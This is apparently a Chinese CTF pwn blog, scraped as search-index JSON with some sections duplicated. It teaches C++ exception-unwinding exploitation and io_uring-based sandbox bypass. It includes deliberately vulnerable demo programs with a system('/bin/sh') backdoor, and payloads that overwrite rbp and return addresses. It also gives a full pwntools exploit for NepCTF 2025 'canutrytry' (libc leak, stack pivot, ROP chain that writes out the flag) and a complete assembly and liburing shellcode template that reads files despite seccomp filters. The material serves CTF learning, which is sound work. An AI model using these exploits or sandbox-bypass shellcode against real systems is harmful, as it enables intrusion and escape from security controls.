我们用noexcept来承诺一个函数不会抛出异常，这种承诺叫做nonthrowing specification（不抛异常说明） 需要注意： noexcept 必须出现在所有函数声明和定义里，或者都不出现 void f() noexcept; // 声明 void f() noexcept { } // 定义 如果函数声明为 noexcept，但运行时仍然抛出异常，程序会调用 std::terminate，直接结束 noexcept应该在以下两种情形中被使用： 我们确信该函数不会抛出异常 我们不知道如何处理异常 ","date":"2025-08-28","objectID":"/posts/cpp_pwn/:1:2","tags":null,"title":"C++pwn之异常处理","uri":"/posts/cpp_pwn/#noexcept"},{"categories":["pwn"],"collections":null,"content":"pwn中的利用\rdemo1\r修改rbp控制程序执行流 // exception.cpp // g++ exception.cpp -o exc -no-pie -fPIC #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e #include \u003cunistd.h\u003e void backdoor() { try { printf(\"We have never called this backdoor!\"); } catch (const char *s) { printf(\"[!] Backdoor has catched the exception: %s\\n\", s); system(\"/bin/sh\"); } } class x { public: char buf[0x10]; x(void) { // printf(\"x:x() called!\\n\"); } ~x(void) { // printf(\"x:~x() called!\\n\"); } }; void input() { x tmp; printf(\"[!] enter your input:\"); fflush(stdout); int count = 0x100; size_t len = read(0, tmp.buf, count); if (len \u003e 0x10) { throw \"Buffer overflow.\"; } printf(\"[+] input() return.\\n\"); } int main() { try { input(); printf(\"--------------------------------------\\n\"); throw 1; } catch (int x) { printf(\"[-] Int: %d\\n\", x); } catch (const char *s) { printf(\"[-] String: %s\\n\", s); } printf(\"[+] main() return.\\n\"); return 0; } 把input函数的rbp改成puts_got - 8，程序就会跳到puts_got中存储的地址去执行，也就是执行puts函数 pl = b'a'*0x30 + p64(0x404050 -8 ) #puts_got -8 p.sendafter(b'input:',pl) 这里有几个点： pl覆盖了input函数的canary，但是由于栈展开，直接去到上层调用链找catch，不会检查canary input函数[rbp]存的是main函数的rbp，减去8就是main函数的返回地址，这里是去改main函数的返回地址为puts函数 demo2\r修改retaddr，调用其他catch // exception.cpp // g++ exception.cpp -o exc -no-pie -fPIC #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e #include \u003cunistd.h\u003e void backdoor() { try { printf(\"We have never called this backdoor!\"); } catch (const char *s) { printf(\"[!] Backdoor has catched the exception: %s\\n\", s); system(\"/bin/sh\"); } } class x { public: char buf[0x10]; x(void) { // printf(\"x:x() called!\\n\"); } ~x(void) { // printf(\"x:~x() called!\\n\"); } }; void test() { x tmp; printf(\"[!] enter your input:\"); fflush(stdout); int count = 0x100; size_t len = read(0, tmp.buf, count); if (len \u003e 0x10) { throw \"Buffer overflow.\"; } printf(\"[+] test() return.\\n\"); } void input() { try { test(); } catch (const char *s) { printf(\"[-] String(From input): %s\\n\", s); } printf(\"[+] input() return.\\n\"); } int main() { try { input(); printf(\"--------------------------------------\\n\"); throw 1; } catch (int x) { printf(\"[-] Int: %d\\n\", x); } catch (const char *s) { printf(\"[-] String: %s\\n\", s); } printf(\"[+] main() return.\\n\"); return 0; } 这里，我们发送pl1，就能调用到backdoor函数里的catch pl = pad + p64(0x404050-0x8)#puts_got -8 pl1 = b'a'*0x30+ p64(0x404050-0x8) + p64(0x401292+1)#backdoor_addr + 1 p.sendafter(b'input:',pl1) pl1把input函数的返回地址改成了backdoor_addr + 1，而抛出异常是在input函数里抛出的，此时的调用链就变成了input -\u003e backdoor，input中没有找到对应的handler，backdoor中有，就去执行backdoor里的了 为什么需要把backdoor_addr去加1？返回地址需要在backdoor函数try区域内，demo2中的范围是(0x401293,0x401297] ","date":"2025-08-28","objectID":"/posts/cpp_pwn/:1:3","tags":null,"title":"C++pwn之异常处理","uri":"/posts/cpp_pwn/#pwn中的利用"},{"categories":["pwn"],"collections":null,"content":"pwn中的利用\rdemo1\r修改rbp控制程序执行流 // exception.cpp // g++ exception.cpp -o exc -no-pie -fPIC #include #include #include void backdoor() { try { printf(\"We have never called this backdoor!\"); } catch (const char *s) { printf(\"[!] Backdoor has catched the exception: %s\\n\", s); system(\"/bin/sh\"); } } class x { public: char buf[0x10]; x(void) { // printf(\"x:x() called!\\n\"); } ~x(void) { // printf(\"x:~x() called!\\n\"); } }; void input() { x tmp; printf(\"[!] enter your input:\"); fflush(stdout); int count = 0x100; size_t len = read(0, tmp.buf, count); if (len \u003e 0x10) { throw \"Buffer overflow.\"; } printf(\"[+] input() return.\\n\"); } int main() { try { input(); printf(\"--------------------------------------\\n\"); throw 1; } catch (int x) { printf(\"[-] Int: %d\\n\", x); } catch (const char *s) { printf(\"[-] String: %s\\n\", s); } printf(\"[+] main() return.\\n\"); return 0; } 把input函数的rbp改成puts_got - 8，程序就会跳到puts_got中存储的地址去执行，也就是执行puts函数 pl = b'a'*0x30 + p64(0x404050 -8 ) #puts_got -8 p.sendafter(b'input:',pl) 这里有几个点： pl覆盖了input函数的canary，但是由于栈展开，直接去到上层调用链找catch，不会检查canary input函数[rbp]存的是main函数的rbp，减去8就是main函数的返回地址，这里是去改main函数的返回地址为puts函数 demo2\r修改retaddr，调用其他catch // exception.cpp // g++ exception.cpp -o exc -no-pie -fPIC #include #include #include void backdoor() { try { printf(\"We have never called this backdoor!\"); } catch (const char *s) { printf(\"[!] Backdoor has catched the exception: %s\\n\", s); system(\"/bin/sh\"); } } class x { public: char buf[0x10]; x(void) { // printf(\"x:x() called!\\n\"); } ~x(void) { // printf(\"x:~x() called!\\n\"); } }; void test() { x tmp; printf(\"[!] enter your input:\"); fflush(stdout); int count = 0x100; size_t len = read(0, tmp.buf, count); if (len \u003e 0x10) { throw \"Buffer overflow.\"; } printf(\"[+] test() return.\\n\"); } void input() { try { test(); } catch (const char *s) { printf(\"[-] String(From input): %s\\n\", s); } printf(\"[+] input() return.\\n\"); } int main() { try { input(); printf(\"--------------------------------------\\n\"); throw 1; } catch (int x) { printf(\"[-] Int: %d\\n\", x); } catch (const char *s) { printf(\"[-] String: %s\\n\", s); } printf(\"[+] main() return.\\n\"); return 0; } 这里，我们发送pl1，就能调用到backdoor函数里的catch pl = pad + p64(0x404050-0x8)#puts_got -8 pl1 = b'a'*0x30+ p64(0x404050-0x8) + p64(0x401292+1)#backdoor_addr + 1 p.sendafter(b'input:',pl1) pl1把input函数的返回地址改成了backdoor_addr + 1，而抛出异常是在input函数里抛出的，此时的调用链就变成了input -\u003e backdoor，input中没有找到对应的handler，backdoor中有，就去执行backdoor里的了 为什么需要把backdoor_addr去加1？返回地址需要在backdoor函数try区域内，demo2中的范围是(0x401293,0x401297] ","date":"2025-08-28","objectID":"/posts/cpp_pwn/:1:3","tags":null,"title":"C++pwn之异常处理","uri":"/posts/cpp_pwn/#demo1"},{"categories":["pwn"],"collections":null,"content":"pwn中的利用\rdemo1\r修改rbp控制程序执行流 // exception.cpp // g++ exception.cpp -o exc -no-pie -fPIC #include #include #include void backdoor() { try { printf(\"We have never called this backdoor!\"); } catch (const char *s) { printf(\"[!] Backdoor has catched the exception: %s\\n\", s); system(\"/bin/sh\"); } } class x { public: char buf[0x10]; x(void) { // printf(\"x:x() called!\\n\"); } ~x(void) { // printf(\"x:~x() called!\\n\"); } }; void input() { x tmp; printf(\"[!] enter your input:\"); fflush(stdout); int count = 0x100; size_t len = read(0, tmp.buf, count); if (len \u003e 0x10) { throw \"Buffer overflow.\"; } printf(\"[+] input() return.\\n\"); } int main() { try { input(); printf(\"--------------------------------------\\n\"); throw 1; } catch (int x) { printf(\"[-] Int: %d\\n\", x); } catch (const char *s) { printf(\"[-] String: %s\\n\", s); } printf(\"[+] main() return.\\n\"); return 0; } 把input函数的rbp改成puts_got - 8，程序就会跳到puts_got中存储的地址去执行，也就是执行puts函数 pl = b'a'*0x30 + p64(0x404050 -8 ) #puts_got -8 p.sendafter(b'input:',pl) 这里有几个点： pl覆盖了input函数的canary，但是由于栈展开，直接去到上层调用链找catch，不会检查canary input函数[rbp]存的是main函数的rbp，减去8就是main函数的返回地址，这里是去改main函数的返回地址为puts函数 demo2\r修改retaddr，调用其他catch // exception.cpp // g++ exception.cpp -o exc -no-pie -fPIC #include #include #include void backdoor() { try { printf(\"We have never called this backdoor!\"); } catch (const char *s) { printf(\"[!] Backdoor has catched the exception: %s\\n\", s); system(\"/bin/sh\"); } } class x { public: char buf[0x10]; x(void) { // printf(\"x:x() called!\\n\"); } ~x(void) { // printf(\"x:~x() called!\\n\"); } }; void test() { x tmp; printf(\"[!] enter your input:\"); fflush(stdout); int count = 0x100; size_t len = read(0, tmp.buf, count); if (len \u003e 0x10) { throw \"Buffer overflow.\"; } printf(\"[+] test() return.\\n\"); } void input() { try { test(); } catch (const char *s) { printf(\"[-] String(From input): %s\\n\", s); } printf(\"[+] input() return.\\n\"); } int main() { try { input(); printf(\"--------------------------------------\\n\"); throw 1; } catch (int x) { printf(\"[-] Int: %d\\n\", x); } catch (const char *s) { printf(\"[-] String: %s\\n\", s); } printf(\"[+] main() return.\\n\"); return 0; } 这里，我们发送pl1，就能调用到backdoor函数里的catch pl = pad + p64(0x404050-0x8)#puts_got -8 pl1 = b'a'*0x30+ p64(0x404050-0x8) + p64(0x401292+1)#backdoor_addr + 1 p.sendafter(b'input:',pl1) pl1把input函数的返回地址改成了backdoor_addr + 1，而抛出异常是在input函数里抛出的，此时的调用链就变成了input -\u003e backdoor，input中没有找到对应的handler，backdoor中有，就去执行backdoor里的了 为什么需要把backdoor_addr去加1？返回地址需要在backdoor函数try区域内，demo2中的范围是(0x401293,0x401297] ","date":"2025-08-28","objectID":"/posts/cpp_pwn/:1:3","tags":null,"title":"C++pwn之异常处理","uri":"/posts/cpp_pwn/#demo2"},{"categories":["pwn"],"collections":null,"content":"NepCTF 2025 canutrytry\r修改rbp控制程序执行流+修改retaddr调用其他catch+栈迁移 ","date":"2025-08-28","objectID":"/posts/cpp_pwn/:2:0","tags":null,"title":"C++pwn之异常处理","uri":"/posts/cpp_pwn/#nepctf-2025-canutrytry"},{"categories":["pwn"],"collections":null,"content":"逆向分析\rvoid __fastcall __noreturn main(__int64 a1, char **a2, char **a3) { int v3; // [rsp+4h] [rbp-2Ch] BYREF unsigned __int64 v4; // [rsp+18h] [rbp-18h] v4 = __readfsqword(0x28u); init(); while ( 1 ) { while ( 1 ) { menu(); std::istream::operator\u003e\u003e(\u0026std::cin, \u0026v3); if ( v3 != 1 ) break; visit(); } if ( v3 != 2 ) exit(0); leave(); } } 在init中： 开了沙箱，只允许四个系统调用，read、write、close、futex， 打开了flag，把flag读到0x4053c0 提供两个选项visit和leave **visit**中提供三个选项： **left：**根据size_list申请堆块 **right：**讲size写入size_list数组 **stright：**输入index，往相应堆块中读入数据 leave： 输入index，把堆块内容复制到栈中**（这里存在栈溢出）**，如果size大于0x10，就抛出异常 异常处理： 抛出异常： visit中的left如果检查到size小于等于0,就会抛出**“invalid size”** leave中如果检测到size大于0x10就会抛出**“stack overflow”** leave和visit中都没有catch，main中有两个catch(char const*)，抛出异常后都会stack unwinding，然后到main中处理 其中一个catch会泄露libc地址和栈地址 .... mov rax, cs:setbuf_ptr mov rsi, rax lea rax, format ; \"setbufaddr:%p\\n\" mov rdi, rax ; format mov eax, 0 call _printf lea rax, [rbp+var_2C] mov rsi, rax lea rax, aStackaddrP ; \"stackaddr:%p\\n\" mov rdi, rax ; format mov eax, 0 call _printf ; } // starts at 401FAD call ___cxa_end_catch jmp loc_401ED4 抛出异常的时候并不会调用另一个catch： loc_401F2B: ; void * mov rdi, rax call ___cxa_begin_catch mov [rbp+var_20], rax ; try { call write_shellcode ; } // starts at 401F37 nop call ___cxa_end_catch call enterflag_writerbp mov eax, 0 mov rdx, [rbp+var_18] sub rdx, fs:28h jz loc_402060 loc_402060: mov rbx, [rbp+var_8] leave retn ; } // starts at 401EB3 main endp enterflag_writerbp中的另一个catch就是执行leave;ret（给了栈迁移的思路） ","date":"2025-08-28","objectID":"/posts/cpp_pwn/:2:1","tags":null,"title":"C++pwn之异常处理","uri":"/posts/cpp_pwn/#逆向分析"},{"categories":["pwn"],"collections":null,"content":"思路过程\r首先，泄露出libc和栈地址 leave中栈溢出写retaddr为这个try内的地址（就能去调用到那个不会被调用到的catch） .text:0000000000401ED4 ; try { .text:0000000000401ED4 call menu .text:0000000000401ED4 ; } // starts at 401ED4 接着写入rop链，栈迁移到这里执行rop链 exp: from pwn import * context.terminal = [\"tmux\", \"splitw\", \"-h\"] context(os='linux',arch='amd64',log_level='debug') address = './pwn' elf = ELF(address) libc = elf.libc gdbscript = \\ \"\"\" bp 0x4019d1 c \"\"\" if len(sys.argv) \u003e 1 and sys.argv[1] == \"r\": p = remote(\"192.168.0.1\",8000 ) elif len(sys.argv) \u003e 1 and sys.argv[1] == \"d\": p = gdb.debug(address, gdbscript = gdbscript) else: p = process(address) def dbg(): gdb.attach(p) # pause() def cmd(choice): p.sendlineafter(b'\u003e\u003e',str(choice).encode()) def leave(index): cmd(2) p.sendlineafter(b'index: ',str(index).encode()) def left(): cmd(1) p.sendlineafter(b'\u003e\u003e',b'1') def right(size): cmd(1) p.sendlineafter(b'\u003e\u003e',b'2') p.sendlineafter(b'size:',str(size).encode()) def stright(index,content): cmd(1) p.sendlineafter(b'\u003e\u003e',b'3') p.sendlineafter(b'index:',str(index)) p.sendafter(b'content:',content) right(0x30) right(-1) left() left() p.recvuntil(b'setbufaddr:') libc.address = int(p.recv(14),16) - 0x88060 p.recvuntil(b'stackaddr:') stack = int(p.recv(14),16) success(\"libc -\u003e 0x%x\",libc.address) success(\"stack -\u003e 0x%x\",stack) pl = b'a'*0x20 + p64(stack-0x14) + p64(0x401ED4+1) #不能破坏栈 stright(0,pl) leave(0) #进入另一个catch p.recvuntil(b'now!\\n') #write(2,0x4053c0,0x20) flag_addr = 0x4053c0 #shellcode_addr = 0x405460 pop_rax_ret = 0x45eb0 + libc.address pop_rdi_ret = 0x2a3e5+ libc.address pop_rsi_ret = 0x2be51 + libc.address pop_rdx_r12_ret = 0x11f497+ libc.address rop = p64(0xdeedbeef) rop += p64(pop_rdi_ret) + p64(2) rop += p64(pop_rsi_ret) + p64(flag_addr) rop += p64(pop_rdx_r12_ret) + p64(0x100)*2 rop += p64(libc.symbols['write']) p.send(rop) # pl = p64(0x405460) pl = b'flag' p.sendafter(b'flag: ',pl) #0x405400 -\u003e 0x405460(rop) pl = b'a'*0x10 + p64(0x405460) # dbg() p.send(pl) p.interactive() # 0x0000000000045eb0 : pop rax ; ret # 0x000000000002a3e5 : pop rdi ; ret # 0x000000000002be51 : pop rsi ; ret # 0x000000000011f497 : pop rdx ; pop r12 ; ret ","date":"2025-08-28","objectID":"/posts/cpp_pwn/:2:2","tags":null,"title":"C++pwn之异常处理","uri":"/posts/cpp_pwn/#思路过程"},{"categories":["pwn"],"collections":null,"content":"参考文章\r《C++.Primer.5th.Edition_2013》 https://en.cppreference.com/w/cpp/language/try.html https://bbs.kanxue.com/thread-284745.htm C++异常处理机制及其利用研究 ","date":"2025-08-28","objectID":"/posts/cpp_pwn/:3:0","tags":null,"title":"C++pwn之异常处理","uri":"/posts/cpp_pwn/#参考文章"},{"categories":["pwn"],"collections":null,"content":"突破沙箱规则，实现orw ","date":"2025-08-23","objectID":"/posts/io_uring/:0:0","tags":null,"title":"io_uring","uri":"/posts/io_uring/#"},{"categories":["pwn"],"collections":null,"content":"基础知识\rio_uring涉及三个系统调用 io_uring_setup(2) io_uring_register(2) io_uring_enter(2) ","date":"2025-08-23","objectID":"/posts/io_uring/:1:0","tags":null,"title":"io_uring","uri":"/posts/io_uring/#基础知识"},{"categories":["pwn"],"collections":null,"content":"io_uring_setup\r用于初始化执行异步IO的上下文 #include \u003cliburing.h\u003e int io_uring_setup(u32 entries, struct io_uring_params *p); 这个系统调用 创建一个 SQ 和一个 CQ 返回一个文件描述符，随后作为其他相关系统调用的参数 SQ 和 CQ 在应用和内核之间共享（需要用到mmap，还需要mmap SQEs），避免了在初始化和完成 I/O 时（initiating and completing I/O）拷贝数据。 参数： entries参数： 设置SQ和CQ的初始容量至少为entries（至少是因为entries必须是2的幂次方（如32、64、512等），如果不是内核也会自动对齐到最近的更大幂次值（如传入100会被调整为128）） io_uring_params结构体： 一般都是把io_uring_params初始化然后清零，再传入io_uring_setup，内核再将一些返回的信息写入这个结构体 struct io_uring_params { __u32 sq_entries; // 实际提交队列（SQ）大小 __u32 cq_entries; // 实际完成队列（CQ）大小 __u32 flags; // 创建 io_uring 的标志（由用户指定），为0采用中断驱动模式 __u32 sq_thread_cpu; // SQ polling 线程绑定的 CPU __u32 sq_thread_idle; // SQ polling 线程空闲休眠时间 __u32 features; // 内核支持的特性标志 __u32 wq_fd; // 共享 workqueue 的 io_uring 实例 fd __u32 resv[3]; // 保留字段,必须为0 struct io_sqring_offsets sq_off; // SQ 环形队列的偏移信息 struct io_cqring_offsets cq_off; // CQ 环形队列的偏移信息 }; struct io_sqring_offsets { __u32 head; // SQ 的 head 指针（用户态消费，内核读取） __u32 tail; // SQ 的 tail 指针（用户态生产，内核读取） __u32 ring_mask; // 环大小掩码，用于索引取模 __u32 ring_entries;// SQ ring 的 entry 总数 __u32 flags; // SQ 状态标志位 __u32 dropped; // 内核丢弃的 SQE 数量 __u32 array; // SQE 索引数组（存放 SQE 的顺序） __u32 resv1; // 保留字段 __u64 user_addr; // 用户自定义地址（较新内核引入） }; struct io_cqring_offsets { __u32 head; // CQ 的 head 指针（用户态消费） __u32 tail; // CQ 的 tail 指针（内核生产） __u32 ring_mask; // 环大小掩码，用于索引取模 __u32 ring_entries;// CQ ring 的 entry 总数 __u32 overflow; // CQ 溢出计数 __u32 cqes; // CQE 数组起始偏移 __u32 flags; // CQ 状态标志 __u32 resv1; // 保留 __u64 user_addr; // 用户自定义地址 }; ","date":"2025-08-23","objectID":"/posts/io_uring/:1:1","tags":null,"title":"io_uring","uri":"/posts/io_uring/#io_uring_setup"},{"categories":["pwn"],"collections":null,"content":"io_uring_enter\r#include \u003cliburing.h\u003e int io_uring_enter(unsigned int fd, unsigned int to_submit, unsigned int min_complete, unsigned int flags, sigset_t *sig); 这个系统调用用于初始化和完成（initiate and complete）I/O，使用共享的 SQ 和 CQ。 单次调用同时执行： 提交新的 I/O 请求 等待 I/O 完成 参数： fd 是 io_uring_setup() 返回的文件描述符 to_submit 告知内核当前有多少个 SQE已准备就绪，可以立即被消费和提交 min_complete默认模式，会等待这个数量的 I/O 事件完成再返回 flags用于控制内核行为 sig设置进程的信号屏蔽状态，如：是否会被Ctrl+c终止。进行orw的话，置0就行 io_uring_sqe 用于传递IO操作的具体信息 opcode：决定执行什么操作，其中包含一些文件IO操作(如：一些等价于open、write的操作)、进程管理操作等 /* * IO submission data structure (Submission Queue Entry) */ struct io_uring_sqe { __u8 opcode; /* type of operation for this sqe */ __u8 flags; /* IOSQE_ flags */ __u16 ioprio; /* ioprio for the request */ __s32 fd; /* file descriptor to do IO on */ union { __u64 off; /* offset into file */ __u64 addr2; struct { __u32 cmd_op; __u32 __pad1; }; }; union { __u64 addr; /* pointer to buffer or iovecs */ __u64 splice_off_in; struct { __u32 level; __u32 optname; }; }; __u32 len; /* buffer size or number of iovecs */ union { __kernel_rwf_t rw_flags; __u32 fsync_flags; __u16 poll_events; /* compatibility */ __u32 poll32_events; /* word-reversed for BE */ __u32 sync_range_flags; __u32 msg_flags; __u32 timeout_flags; __u32 accept_flags; __u32 cancel_flags; __u32 open_flags; __u32 statx_flags; __u32 fadvise_advice; __u32 splice_flags; __u32 rename_flags; __u32 unlink_flags; __u32 hardlink_flags; __u32 xattr_flags; __u32 msg_ring_flags; __u32 uring_cmd_flags; __u32 waitid_flags; __u32 futex_flags; __u32 install_fd_flags; __u32 nop_flags; }; __u64 user_data; /* data to be passed back at completion time */ /* pack this to avoid bogus arm OABI complaints */ union { /* index into fixed buffers, if used */ __u16 buf_index; /* for grouped buffer selection */ __u16 buf_group; } __attribute__((packed)); /* personality to use, if used */ __u16 personality; union { __s32 splice_fd_in; __u32 file_index; __u32 optlen; struct { __u16 addr_len; __u16 __pad3[1]; }; }; union { struct { __u64 addr3; __u64 __pad2[1]; }; __u64 optval; /* * If the ring is initialized with IORING_SETUP_SQE128, then * this field is used for 80 bytes of arbitrary command data */ __u8 cmd[0]; }; }; ","date":"2025-08-23","objectID":"/posts/io_uring/:1:2","tags":null,"title":"io_uring","uri":"/posts/io_uring/#io_uring_enter"},{"categories":["pwn"],"collections":null,"content":"模板\rfrom pwn import * \"\"\" rsp+0x100 0x078: struct io_uring_params params = {}; rsp+0x200 0x008: uring_fd rsp+0x208 0x008: sq_ring ptr rsp+0x210 0x008: cq_ring ptr rsp+0x218 0x008: sqes ptr rsp+0x220 0x008: flag_fd rsp+0x300 0x100: buffer \"\"\" shellcode = asm(\"\"\" /*视情况调整栈帧*/ add rsp, 0x2000 /*int uring_fd = syscall(SYS_io_uring_setup, 16, \u0026params);*/ mov rax, 0 lea rdi, [rsp+0x100] mov rcx, 15 rep stosq mov rdi, 16 lea rsi, [rsp+0x100] mov rax, 0x1a9 syscall /*unsigned char *sq_ring = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, uring_fd, IORING_OFF_SQ_RING);*/ mov qword ptr [rsp+0x200], rax xor rdi, rdi mov rsi, 0x1000 mov rdx, 3 mov r10, 1 mov r8, qword ptr [rsp+0x200] mov r9, 0 mov rax, 9 syscall mov qword ptr [rsp+0x208], rax /*unsigned char *cq_ring = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, uring_fd, IORING_OFF_CQ_RING);*/ xor rdi, rdi mov rsi, 0x1000 mov rdx, 3 mov r10, 1 mov r8, qword ptr [rsp+0x200] mov r9, 0x8000000 mov rax, 9 syscall mov qword ptr [rsp+0x210], rax /*struct io_uring_sqe *sqes = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, uring_fd, IORING_OFF_SQES);*/ xor rdi, rdi mov rsi, 0x1000 mov rdx, 3 mov r10, 1 mov r8, qword ptr [rsp+0x200] mov r9, 0x10000000 mov rax, 9 syscall mov qword ptr [rsp+0x218], rax /*openat*/ mov rax, 0 mov rdi, qword ptr [rsp+0x218] mov rcx, 8 rep stosq mov rdi, qword ptr [rsp+0x218] mov byte ptr [rdi], 18 /*opcode*/ mov byte ptr [rdi+1], 0 /* IOSQE_ flags*/ mov dword ptr [rdi+4], -100 /* file descriptor to do IO on */ /* 要打开文件的路径存放在 rsp+0x300 处 */ mov rax, 0x67616c662f2e mov qword ptr [rsp+0x300], rax lea rax, [rsp+0x300] mov qword ptr [rdi+16], rax /*pathname*/ mov dword ptr [rdi+28], 0 /*open_flag*/ mov rdi, qword ptr [rsp+0x208] mov edx, dword ptr [rsp+0x140] add rdi, rdx mov dword ptr [rdi], 0 mov rdi, qword ptr [rsp+0x208] mov edx, dword ptr [rsp+0x12c] add rdi, rdx add dword ptr [rdi], 1 mov rdi, qword ptr [rsp+0x200] mov rsi, 1 mov rdx, 1 mov r10, 1 xor r8, r8 xor r9, r9 mov rax, 0x1aa syscall mov rdi, qword ptr [rsp+0x210] mov edx, dword ptr [rsp+0x164] add rdi, rdx mov edx, dword ptr [rdi+8] mov qword ptr [rsp+0x220], rdx /*read*/ mov rax, 0 mov rdi, qword ptr [rsp+0x218] mov rcx, 8 rep stosq mov rdi, qword ptr [rsp+0x218] mov byte ptr [rdi], 22 mov rax, qword ptr [rsp+0x220] mov dword ptr [rdi+4], eax lea rax, [rsp+0x300] mov qword ptr [rdi+16], rax mov dword ptr [rdi+24], 0x100 mov rdi, qword ptr [rsp+0x208] mov edx, dword ptr [rsp+0x140] add rdi, rdx mov dword ptr [rdi], 0 mov rdi, qword ptr [rsp+0x208] mov edx, dword ptr [rsp+0x12c] add rdi, rdx add dword ptr [rdi], 1 mov rdi, qword ptr [rsp+0x200] mov rsi, 1 mov rdx, 1 mov r10, 1 xor r8, r8 xor r9, r9 mov rax, 0x1aa syscall /*write*/ mov rax, 0 mov rdi, qword ptr [rsp+0x218] mov rcx, 8 rep stosq mov rdi, qword ptr [rsp+0x218] mov byte ptr [rdi], 23 mov dword ptr [rdi+4], 1 lea rax, [rsp+0x300] mov qword ptr [rdi+16], rax mov dword ptr [rdi+24], 0x100 mov rdi, qword ptr [rsp+0x208] mov edx, dword ptr [rsp+0x140] add rdi, rdx mov dword ptr [rdi], 0 mov rdi, qword ptr [rsp+0x208] mov edx, dword ptr [rsp+0x12c] add rdi, rdx add dword ptr [rdi], 1 mov rdi, qword ptr [rsp+0x200] mov rsi, 1 mov rdx, 3 mov r10, 1 xor r8, r8 xor r9, r9 mov rax, 0x1aa syscall \"\"\") mmap映射： 在初始化io_uring的时候，分别对SQ、CQ、SQEs进行了三次mmap映射，offset参数需要分别设置为IORING_OFF_SQ_RING、IORING_OFF_CQ_RING、IORING_OFF_SQES #define IORING_OFF_SQ_RING 0ULL #define IORING_OFF_CQ_RING 0x8000000ULL #define IORING_OFF_SQES 0x10000000ULL ","date":"2025-08-23","objectID":"/posts/io_uring/:1:3","tags":null,"title":"io_uring","uri":"/posts/io_uring/#模板"},{"categories":["pwn"],"collections":null,"content":"liburing\r实现了对底层系统调用的封装 初始化与清理 struct io_uring ring; // 初始化 (默认128条目) int io_uring_queue_init(unsigned entries, struct io_uring *ring, unsigned flags); // 清理资源 void io_uring_queue_exit(struct io_uring *ring); 提交队列管理 // 获取下一个可用的 SQE struct io_uring_sqe *io_uring_get_sqe(struct io_uring *ring); // 批量提交 SQE int io_uring_submit(struct io_uring *ring); 操作准备函数 // 准备读操作 void io_uring_prep_read(struct io_uring_sqe *sqe, int fd, void *buf, unsigned nbytes, off_t offset); // 准备写操作 void io_uring_prep_write(struct io_uring_sqe *sqe, int fd, const void *buf, unsigned nbytes, off_t offset); // 准备打开操作 void io_uring_prep_openat(struct io_uring_sqe *sqe, int dfd, const char *path, int flags, mode_t mode); // 准备关闭操作 void io_uring_prep_close(struct io_uring_sqe *sqe, int fd); 完成处理 // 等待完成事件 int io_uring_wait_cqe(struct io_uring *ring, struct io_uring_cqe **cqe); // 查看完成事件(非阻塞) int io_uring_peek_cqe(struct io_uring *ring, struct io_uring_cqe **cqe); // 标记事件已处理 void io_uring_cqe_seen(struct io_uring *ring, struct io_uring_cqe *cqe); 进行orw // gcc -o shellcode shellcode.c -luring -lseccomp -static #include \u003cstdio.h\u003e #include \u003cfcntl.h\u003e #include \u003cunistd.h\u003e #include \u003cliburing.h\u003e #include \u003cseccomp.h\u003e #include \u003csyscall.h\u003e #define BUFFER_SIZE 4096 int main() { struct io_uring ring; struct io_uring_cqe *cqe; struct io_uring_sqe *sqe; char buffer[BUFFER_SIZE] = {0}; int fd; io_uring_queue_init(16, \u0026ring, 0); sqe = io_uring_get_sqe(\u0026ring); io_uring_prep_openat(sqe, AT_FDCWD, \"flag\", O_RDONLY, 0); io_uring_submit(\u0026ring); io_uring_wait_cqe(\u0026ring, \u0026cqe); fd = cqe-\u003eres; sqe = io_uring_get_sqe(\u0026ring); io_uring_prep_read(sqe, fd, buffer, BUFFER_SIZE, 0); io_uring_submit(\u0026ring); io_uring_wait_cqe(\u0026ring, \u0026cqe); sqe = io_uring_get_sqe(\u0026ring); io_uring_prep_write(sqe, STDOUT_FILENO, buffer, BUFFER_SIZE, 0); io_uring_submit(\u0026ring); io_uring_queue_exit(\u0026ring); return 0; } ","date":"2025-08-23","objectID":"/posts/io_uring/:1:4","tags":null,"title":"io_uring","uri":"/posts/io_uring/#liburing"},{"categories":["pwn"],"collections":null,"content":"ACTF 2023 master-of-rop\r沙箱禁掉了常用的orw及其替代syscall，需要寻找一些其他的替代syscall line CODE JT JF K ================================= 0000: 0x20 0x00 0x00 0x00000004 A = arch 0001: 0x15 0x00 0x19 0xc000003e if (A != ARCH_X86_64) goto 0027 0002: 0x20 0x00 0x00 0x00000000 A = sys_number 0003: 0x35 0x00 0x01 0x40000000 if (A \u003c 0x40000000) goto 0005 0004: 0x15 0x00 0x16 0xffffffff if (A != 0xffffffff) goto 0027 0005: 0x15 0x15 0x00 0x00000000 if (A == read) goto 0027 0006: 0x15 0x14 0x00 0x00000001 if (A == write) goto 0027 0007: 0x15 0x13 0x00 0x00000002 if (A == open) goto 0027 0008: 0x15 0x12 0x00 0x00000011 if (A == pread64) goto 0027 0009: 0x15 0x11 0x00 0x00000012 if (A == pwrite64) goto 0027 0010: 0x15 0x10 0x00 0x00000013 if (A == readv) goto 0027 0011: 0x15 0x0f 0x00 0x00000014 if (A == writev) goto 0027 0012: 0x15 0x0e 0x00 0x00000028 if (A == sendfile) goto 0027 0013: 0x15 0x0d 0x00 0x0000002c if (A == sendto) goto 0027 0014: 0x15 0x0c 0x00 0x0000002e if (A == sendmsg) goto 0027 0015: 0x15 0x0b 0x00 0x0000003b if (A == execve) goto 0027 0016: 0x15 0x0a 0x00 0x00000101 if (A == openat) goto 0027 0017: 0x15 0x09 0x00 0x00000127 if (A == preadv) goto 0027 0018: 0x15 0x08 0x00 0x00000128 if (A == pwritev) goto 0027 0019: 0x15 0x07 0x00 0x0000012f if (A == name_to_handle_at) goto 0027 0020: 0x15 0x06 0x00 0x00000130 if (A == open_by_handle_at) goto 0027 0021: 0x15 0x05 0x00 0x00000142 if (A == execveat) goto 0027 0022: 0x15 0x04 0x00 0x00000147 if (A == preadv2) goto 0027 0023: 0x15 0x03 0x00 0x00000148 if (A == pwritev2) goto 0027 0024: 0x15 0x02 0x00 0x000001ac if (A == 0x1ac) goto 0027 0025: 0x15 0x01 0x00 0x000001b5 if (A == 0x1b5) goto 0027 0026: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0027: 0x06 0x00 0x00 0x00000000 return KILL 